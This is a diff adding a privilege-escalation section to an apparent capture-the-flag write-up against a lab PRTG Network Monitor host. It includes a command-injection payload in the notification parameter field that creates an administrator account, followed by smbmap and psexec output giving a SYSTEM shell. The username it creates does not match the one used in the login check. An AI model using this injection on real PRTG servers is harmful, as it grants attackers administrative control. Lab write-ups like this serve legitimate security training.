@@ -70,3 +70,43 @@ C:\Windows\system32>whoami
 whoami
 nt authority\system
 ```
+
+### Manual privesc
+[This](https://www.codewatch.org/blog/?p=453) blog post about command injection in PRTG explain how to perform command injection in the parameter field of the notifications configuration with some of the default Demo scripts.
+
+After login, enter in `Setup > Account Settings > Notifications`, click the blue cross on the right and click on `Add new notification`.
+Following the blog post, scroll down to `Execute Program` and click on it.
+For the `Program File` use `Demo exe notification - outfile.ps1` and then in field `Parameter` add `test.txt;net user hollow p3nT3st! /add;net localgroup administrators hollow /add` where the second part is not present on the blog post, but I needed it in order to add my new user to adminsitrators group.
+
+At this point save the notification, click the button on the right (pen in a square) and click the bell icon to send test notification.
+We can check if we have access by using:
+```
+kali@kali:~$ smbmap -H 10.10.10.152 -u pentest -p "p3nT3st!"
+[+] IP: 10.10.10.152:445        Name: 10.10.10.152                                      
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+```
+and we have it!
+
+To get a shell we can use `psexec.py`:
+```
+kali@kali:~$ sudo psexec.py 'hollow:p3nT3st!@10.10.10.152'
+Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.152.....
+[*] Found writable share ADMIN$
+[*] Uploading file tLYZnnku.exe
+[*] Opening SVCManager on 10.10.10.152.....
+[*] Creating service VhkJ on 10.10.10.152.....
+[*] Starting service VhkJ.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+
+Done ✔️
